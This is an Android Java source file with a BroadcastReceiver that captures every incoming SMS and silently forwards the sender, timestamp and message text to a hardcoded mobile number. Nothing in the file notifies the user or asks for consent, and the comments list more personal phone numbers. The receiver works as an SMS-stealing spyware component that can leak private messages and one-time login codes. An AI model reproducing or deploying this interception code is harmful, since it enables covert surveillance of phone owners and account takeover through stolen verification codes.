package com.fyc.mysms;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import utils.Config;

public class SmsReceiver extends BroadcastReceiver {
    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "cyc001";
    private static Context context;
    public static final String phonenum="13632427944";
    public String address=""; //短信地址；
    public String smsContent = "";//短信内容;
    public String receiveTime="";//接收时间
    public Date date;

    @Override
    public void onReceive(Context context, Intent intent) {
        //if(intent.getAction().equals(ACTION)){
            SmsReceiver.context=context;
            Bundle bundle = intent.getExtras();
            if (null == bundle)return;
            Object[] pdus=(Object[])intent.getExtras().get("pdus");
            SmsMessage[] messages=new SmsMessage[pdus.length];
            smsContent = "";
            for(int i=0;i<pdus.length;i++){
                messages[i]=SmsMessage.createFromPdu((byte[])pdus[i]);
                //sb.append("接收到短信来自:\n");
                address=messages[i].getDisplayOriginatingAddress();
                smsContent += messages[i].getMessageBody();
                date = new Date(messages[i].getTimestampMillis());//时间
            }
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String receiveTime = format.format(date);
            Log.i(TAG, receiveTime);
            Log.i(TAG, address);
            Log.i(TAG, smsContent);
            String info=receiveTime+"\r\n"+address+"\r\n"+smsContent;
            if (!Config.DEBUG)
            SendSms(context,phonenum,info);//18917459828  16621531089  13162223536
        //}

    }
    /*
     * 发送短信
     */
    public static boolean SendSms(final Context context,final String address,final String body){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try{
                    PendingIntent pi = PendingIntent.getActivity(context, 0, new Intent(), 0);
                    SmsManager manager = SmsManager.getDefault();
                    //拆分短信内容（手机短信长度限制）
                    List<String> divideContents = manager.divideMessage(body);
                    for (String text : divideContents) {
                        manager.sendTextMessage(address, null, text, pi, null);
                    }
                }catch(IllegalArgumentException e)
                {
                    e.printStackTrace();
                    //return false;
                }
            }
        }).start();
        return true;
    }
}
